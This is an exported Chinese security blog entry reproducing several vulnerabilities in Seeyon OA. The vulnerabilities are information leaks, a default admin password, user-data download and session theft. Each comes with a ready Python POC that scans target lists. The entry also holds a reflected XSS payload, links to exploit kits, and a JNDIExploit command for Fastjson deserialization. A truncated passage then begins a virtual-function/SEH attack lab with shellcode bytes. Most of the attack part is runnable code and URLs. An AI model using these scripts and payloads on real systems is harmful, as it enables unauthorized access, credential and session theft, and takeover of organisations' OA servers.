<h2 id="致远OA-A8-状态监控页面信息泄露"><a href="#致远OA-A8-状态监控页面信息泄露" class="headerlink" title="致远OA A8 状态监控页面信息泄露"></a>致远OA A8 状态监控页面信息泄露</h2><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A8-m 存在状态监控页面信息泄露，攻击者可以从其中获取网站路径和用户名等敏感信息进一步攻击。</p>
<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><p>致远OA A8-m</p>
<h3 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问监控页面URL<code>/seeyon/management/status.jsp</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230208.png"></p>
</li>
<li><p>使用默认后台密码 <strong>WLCCYBD@SEEYON</strong>进行登录后可通过如下URL获取敏感信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/management/status.jsp</span><br><span class="line">/seeyon/logs/login.log</span><br><span class="line">/seeyon/logs/v3x.log</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230249.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230313.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230351.png"></p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A8 m                                                \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/seeyon/management/index.jsp"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">"Password"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {} 存在后台监控地址{}，默认密码为: WLCCYBD@SEEYON\033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {} 请求失败 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>.<span class="built_in">format</span>(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230424.png"></p>
</li>
</ol>
<h2 id="致远OA-A6-DownExcelBeanServlet-用户敏感信息泄露"><a href="#致远OA-A6-DownExcelBeanServlet-用户敏感信息泄露" class="headerlink" title="致远OA A6 DownExcelBeanServlet 用户敏感信息泄露"></a>致远OA A6 DownExcelBeanServlet 用户敏感信息泄露</h2><h3 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息</p>
<h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="复现流程-2"><a href="#复现流程-2" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>访问如下URL<code>yyoa/DownExcelBeanServlet?contenttype=username&amp;contentvalue=&amp;state=1&amp;per_id=0</code>即可跳转下载用户信息文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230509.png"></p>
<p>可以再利用得到的用户名使用弱口令爆破进入OA进一步攻击</p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/DownExcelBeanServlet?contenttype=username&amp;contentvalue=&amp;state=1&amp;per_id=0"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"@"</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {}存在漏洞! \n下载地址:{} \033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>.<span class="built_in">format</span>(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230542.png"></p>
</li>
</ol>
<h2 id="致远OA-A6-initDataAssess-jsp-存在用户敏感信息泄露"><a href="#致远OA-A6-initDataAssess-jsp-存在用户敏感信息泄露" class="headerlink" title="致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露"></a>致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露</h2><h3 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露，可以通过得到的用户名爆破用户密码进入后台进一步攻击</p>
<h3 id="漏洞影响-3"><a href="#漏洞影响-3" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="9-3-复现流程"><a href="#9-3-复现流程" class="headerlink" title="9.3. 复现流程"></a>9.3. 复现流程</h3><ol>
<li><p>访问如下URL<code>/yyoa/assess/js/initDataAssess.jsp</code>泄漏用户信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230632.png"></p>
<p>可以再利用得到的用户名使用弱口令爆破进入OA进一步攻击</p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/assess/js/initDataAssess.jsp"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/yyoa/index.jsp"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">"personList"</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {}存在漏洞！\n泄露地址:{} \033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230732.png"></p>
</li>
</ol>
<h2 id="致远OA-getSessionList-jsp-Session泄漏漏洞"><a href="#致远OA-getSessionList-jsp-Session泄漏漏洞" class="headerlink" title="致远OA getSessionList.jsp Session泄漏漏洞"></a>致远OA getSessionList.jsp Session泄漏漏洞</h2><h3 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况。</p>
<p>漏洞代码如下，当cmd参数为getAll时，便可获取到所有用户的SessionID：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=GBK"</span>%&gt;</span><br><span class="line">&lt;%@ page session= <span class="string">"false"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"net.btdz.oa.ext.https.*"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">reqType</span> <span class="operator">=</span> request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">outXML</span> <span class="operator">=</span> <span class="string">""</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">allowHttps</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"allowHttps"</span>.equalsIgnoreCase(reqType)){</span><br><span class="line">        <span class="comment">//add code to judge whether it allow https or not</span></span><br><span class="line">        allowHttps = FetchSessionList.checkHttps();</span><br><span class="line">        <span class="keyword">if</span> (allowHttps) response.setHeader(<span class="string">"AllowHttps"</span>,<span class="string">"1"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"getAll"</span>.equalsIgnoreCase(reqType)){</span><br><span class="line">        outXML = FetchSessionList.getXMLAll();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"getSingle"</span>.equalsIgnoreCase(reqType)){</span><br><span class="line">        <span class="type">String</span> <span class="variable">sessionId</span> <span class="operator">=</span> request.getParameter(<span class="string">"ssid"</span>);</span><br><span class="line">        <span class="keyword">if</span>(sessionId != <span class="literal">null</span>){</span><br><span class="line">            outXML = FetchSessionList.getXMLBySessionId(sessionId);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        outXML += <span class="string">"&lt;?xml version=\"1.0\" encoding=\"GB2312\"?&gt;\r\n"</span>;</span><br><span class="line">        outXML += <span class="string">"&lt;SessionList&gt;\r\n"</span>;</span><br><span class="line"><span class="comment">//        outXML += "&lt;Session&gt;\r\n";</span></span><br><span class="line"><span class="comment">//        outXML += "&lt;/Session&gt;\r\n";</span></span><br><span class="line">        outXML += <span class="string">"&lt;/SessionList&gt;\r\n"</span>;</span><br><span class="line">    }</span><br><span class="line">    out.println(outXML);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞影响-4"><a href="#漏洞影响-4" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA</p>
<h3 id="复现流程-3"><a href="#复现流程-3" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>漏洞URL为<code>yyoa/ext/https/getSessionList.jsp</code>，添加cmd参数值为getall，成功获取session，通过替换 Session即可登录系统。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230825.png"></p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/ext/https/getSessionList.jsp?cmd=getAll"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/yyoa/index.jsp"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">"&lt;sessionID&gt;"</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {}存在漏洞,Session地址:{} \033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230907.png"></p>
</li>
</ol>
<h2 id="致远OA帆软报表组件反射型XSS漏洞"><a href="#致远OA帆软报表组件反射型XSS漏洞" class="headerlink" title="致远OA帆软报表组件反射型XSS漏洞"></a>致远OA帆软报表组件反射型XSS漏洞</h2><h3 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA <code>/seeyonreport</code> 路径下的组件其实是集成的 帆软报表，存在反射型XSS漏洞。</p>
<h3 id="漏洞影响-5"><a href="#漏洞影响-5" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远A8-V5 V5.6 SP1 </p>
<p>致远A8-V5 V6.1 SP2</p>
<h3 id="复现流程-4"><a href="#复现流程-4" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>使用如下POC可进行反射型XSS攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyonreport/ReportServer?reportlet=&amp;__parameters__={"isSubReport"%3a"true"%2c"TEMPLATEID"%3a"1"%2c"MEMBERID"%3a"&lt;img src%3dx onerror%3dalert('xss')&gt;"%2c"A8SERVERIP"%3a"baidu.com"%2c"A8SERVERPORT"%3a"80"}</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230957.png"></p>
</li>
</ol>
<h1 id="综合利用EXP"><a href="#综合利用EXP" class="headerlink" title="综合利用EXP"></a>综合利用EXP</h1><ol>
<li><p>github上综合利用EXP1：<a href="https://github.com/asdasdqkq1/yonyou-nc-exp">https://github.com/asdasdqkq1/yonyou-nc-exp</a></p>
<p>涉及漏洞包括：</p>
<ul>
<li><p>致远OA A8 状态监控页面信息泄露</p>
</li>
<li><p>致远OA A6 initDataAssess.jsp 用户敏感信息泄露</p>
</li>
<li><p>致远OA A6 createMysql.jsp 数据库敏感信息泄露</p>
</li>
<li><p>致远OA A6 DownExcelBeanServlet 用户敏感信息泄露</p>
</li>
<li><p>致远OA getSessionList.jsp Session泄漏漏洞</p>
</li>
<li><p>致远OA A6 setextno.jsp SQL注入漏洞</p>
</li>
<li><p>致远OA A6 test.jsp SQL注入漏洞</p>
</li>
<li><p>致远OA ajax.do 登录绕过&amp;任意文件上传</p>
</li>
<li><p>致远OA Session泄露 任意文件上传漏洞</p>
</li>
<li><p>致远OA webmail.do任意文件下载</p>
</li>
</ul>
</li>
<li><p>github上综合利用EXP2：<a href="https://github.com/z1un/seeyou_exp">https://github.com/z1un/seeyou_exp</a></p>
<ul>
<li><p>致远OA A6 createMysql数据库敏感信息泄露 </p>
</li>
<li><p>致远OA A6 DownExcelBeanServlet用户敏感信息下载</p>
</li>
<li><p>致远OA A6 initDataAssess用户敏感信息泄露</p>
</li>
<li><p>致远OA A6 setextno SQL注入Getshell</p>
</li>
<li><p>致远OA A6 test SQL注入Getshell</p>
</li>
<li><p>致远OA A8 htmlofficeservlet RCE</p>
</li>
<li><p>致远OA getSessionList Session泄漏</p>
</li>
<li><p>致远OA ajax 登录绕过 任意文件上传</p>
</li>
<li><p>致远OA webmail任意文件下载</p>
</li>
<li><p>致远OA Session泄露 任意文件上传 </p>
</li>
<li><p>致远OA Fastjson反序列化</p>
<p>其中致远OA Fastjson 反序列化漏洞没有实现自动化，可利用工具：<a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-<span class="number">1.2</span>-SNAPSHOT.jar -i <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> -l <span class="number">1389</span> -p <span class="number">1289</span></span><br></pre></td></tr></table></figure>

<p>先在vps运行以上JNDI反序列化漏洞利用工具，然后复制脚本提供的Payload，替换ldap链接到BurpSuite中发包测试发包，可回显。</p>
</li>
</ul>
</li>
</ol>
<p><strong>注：仅当作技术研究，请勿用于非法用途 后果作者概不负责！！！</strong></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞 致远OA</tag>
      </tags>
  </entry>
  <entry>
    <title>虚函数攻击和SEH攻击实验</title>
    <url>/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E5%92%8CSEH%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>了解<code>SEH</code>攻击和虚函数攻击的基本原理；</li>
<li>调试虚函数攻击代码，理解虚函数工作机制与内存分布方式，掌握基本的虚函数攻击与计算方式，并可以用<code>OllyDbg</code>追踪；</li>
<li>通过调试<code>SEH</code>攻击代码，理解<code>Windows</code>异常处理机制，掌握针对<code>SEH</code>的攻击方式，并利用<code>OllyDbg</code>跟踪异常状态。 <span id="more"></span></li>
</ol>
<h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x33\xDB\x53\x68\x34\x33\x32\x31\x68\x44\x43\x42\x41\x8B\xC4\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span 